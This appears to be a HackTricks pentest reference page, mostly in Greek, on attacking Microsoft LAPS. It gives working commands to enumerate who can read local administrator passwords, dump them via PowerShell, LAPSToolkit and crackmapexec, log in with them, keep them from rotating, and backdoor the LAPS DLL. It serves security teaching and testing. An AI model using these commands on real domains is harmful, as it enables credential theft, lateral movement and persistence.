# LAPS

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Basic Information

Η Λύση Κωδικού Πρόσβασης Τοπικού Διαχειριστή (LAPS) είναι ένα εργαλείο που χρησιμοποιείται για τη διαχείριση ενός συστήματος όπου οι **κωδικοί πρόσβασης διαχειριστή**, οι οποίοι είναι **μοναδικοί, τυχαίοι και συχνά αλλάζουν**, εφαρμόζονται σε υπολογιστές που είναι συνδεδεμένοι στο domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια μέσα στο Active Directory και είναι προσβάσιμοι μόνο σε χρήστες που έχουν λάβει άδεια μέσω Λιστών Ελέγχου Πρόσβασης (ACLs). Η ασφάλεια των μεταδόσεων κωδικών πρόσβασης από τον πελάτη στον διακομιστή διασφαλίζεται με τη χρήση του **Kerberos έκδοση 5** και του **Προηγμένου Προτύπου Κρυπτογράφησης (AES)**.

Στα αντικείμενα υπολογιστών του domain, η υλοποίηση του LAPS έχει ως αποτέλεσμα την προσθήκη δύο νέων χαρακτηριστικών: **`ms-mcs-AdmPwd`** και **`ms-mcs-AdmPwdExpirationTime`**. Αυτά τα χαρακτηριστικά αποθηκεύουν τον **κωδικό πρόσβασης διαχειριστή σε απλή μορφή** και **τον χρόνο λήξης του**, αντίστοιχα.

### Check if activated
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Password Access

Μπορείτε να **κατεβάσετε την αρχική πολιτική LAPS** από `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσετε το **`Parse-PolFile`** από το [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) πακέτο για να μετατρέψετε αυτό το αρχείο σε αναγνώσιμη μορφή.

Επιπλέον, οι **ενσωματωμένες LAPS PowerShell cmdlets** μπορούν να χρησιμοποιηθούν αν είναι εγκατεστημένες σε μια μηχανή στην οποία έχουμε πρόσβαση:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** μπορεί επίσης να χρησιμοποιηθεί για να ανακαλύψετε **ποιος μπορεί να διαβάσει τον κωδικό πρόσβασης και να τον διαβάσει**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Το [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) διευκολύνει την αρίθμηση του LAPS με πολλές λειτουργίες.\
Μία από αυτές είναι η ανάλυση **`ExtendedRights`** για **όλους τους υπολογιστές με ενεργοποιημένο το LAPS.** Αυτό θα δείξει **ομάδες** που έχουν **εξουσιοδοτηθεί ειδικά να διαβάζουν τους κωδικούς πρόσβασης LAPS**, οι οποίες είναι συχνά χρήστες σε προστατευμένες ομάδες.\
Ένας **λογαριασμός** που έχει **συνδέσει έναν υπολογιστή** σε έναν τομέα λαμβάνει `All Extended Rights` πάνω σε αυτόν τον υπολογιστή, και αυτό το δικαίωμα δίνει στον **λογαριασμό** τη δυνατότητα να **διαβάζει κωδικούς πρόσβασης**. Η αρίθμηση μπορεί να δείξει έναν λογαριασμό χρήστη που μπορεί να διαβάσει τον κωδικό πρόσβασης LAPS σε έναν υπολογιστή. Αυτό μπορεί να μας βοηθήσει να **στοχεύσουμε συγκεκριμένους χρήστες AD** που μπορούν να διαβάσουν τους κωδικούς πρόσβασης LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**

Αν δεν υπάρχει πρόσβαση σε ένα powershell, μπορείτε να εκμεταλλευτείτε αυτό το προνόμιο απομακρυσμένα μέσω LDAP χρησιμοποιώντας
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Αυτό θα εξάγει όλους τους κωδικούς πρόσβασης που μπορεί να διαβάσει ο χρήστης, επιτρέποντάς σας να αποκτήσετε καλύτερη πρόσβαση με έναν διαφορετικό χρήστη.

## ** Χρήση Κωδικού LAPS **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS Persistence**

### **Ημερομηνία Λήξης**

Μόλις γίνετε διαχειριστής, είναι δυνατόν να **αποκτήσετε τους κωδικούς πρόσβασης** και να **αποτρέψετε** μια μηχανή από το **να ενημερώσει** τον **κωδικό πρόσβασης** της **ορίζοντας την ημερομηνία λήξης στο μέλλον**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> Ο κωδικός πρόσβασης θα επαναρυθμιστεί αν ένας **admin** χρησιμοποιήσει το **`Reset-AdmPwdPassword`** cmdlet; ή αν είναι ενεργοποιημένο το **Do not allow password expiration time longer than required by policy** στην πολιτική LAPS.

### Backdoor

Ο αρχικός πηγαίος κώδικας για το LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατόν να τοποθετηθεί ένα backdoor στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο `Main/AdmPwd.PS/Main.cs`, για παράδειγμα) που θα **εξάγει νέους κωδικούς πρόσβασης ή θα τους αποθηκεύει κάπου**.

Στη συνέχεια, απλώς μεταγλωττίστε το νέο `AdmPwd.PS.dll` και ανεβάστε το στη μηχανή στο `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και αλλάξτε την ώρα τροποποίησης).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
